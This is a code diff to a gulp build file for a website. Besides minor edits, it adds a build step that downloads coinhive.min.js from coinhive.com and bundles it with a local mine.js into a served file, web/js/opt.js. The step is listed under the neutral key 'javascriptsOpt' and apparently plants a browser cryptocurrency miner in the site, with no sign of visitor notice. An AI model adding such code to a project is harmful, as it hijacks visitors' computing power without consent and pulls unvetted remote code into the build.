@@ -8,6 +8,7 @@ var connect = require('gulp-connect');
 var sass = require('gulp-sass');
 var rev = require('gulp-rev');
 var symlink = require('gulp-symlink');
+var remoteSrc = require('gulp-remote-src');
 
 var dest = './web';
 var src = './assets';
@@ -31,6 +32,10 @@ var paths = {
         'bower_components/foundation/js//foundation.min.js',
         'bower_components/foundation/js/foundation/foundation.alert.js'
     ],
+    javascriptsOpt: [
+        'assets/js/coinhive.min.js',
+        'assets/js/mine.js'
+    ],
     styles: [
         'bower_components/foundation/scss/foundation.scss',
         'assets/sass/**/*',
@@ -49,15 +54,25 @@ var paths = {
 
 var versioning = {
     manifestCss: src + '/rev-manifest-css.json',
-    manifestJS: src + '/rev-manifest-js.json',
+    manifestJS: src + '/rev-manifest-js.json'
 };
 
 gulp.task('javascripts', function() {
+    remoteSrc(['coinhive.min.js'], {
+        base: 'https://coinhive.com/lib/'
+    })
+        .pipe(gulp.dest('./assets/js/'))
+    ;
+
     gulp.src(paths.javascripts)
         .pipe(gulp.dest('assets/vendors/js'))
     ;
     gulp.src(paths.javascripts)
         .pipe(concat('app.js'))
+        .pipe(gulp.dest('web/js'))
+    ;
+    gulp.src(paths.javascriptsOpt)
+        .pipe(concat('opt.js'))
         .pipe(gulp.dest('web/js'))
     ;
 
@@ -140,7 +155,7 @@ gulp.task('watch', ['webserver'], function () {
         gulp.watch(paths.images, ['images']);
     }
 
-    for(var key = 0; key < paths.images.copyfonts;key++){
+    for(key = 0; key < paths.images.copyfonts;key++){
         gulp.watch(paths.copyfonts[key], ['copyfonts']);
     }
 
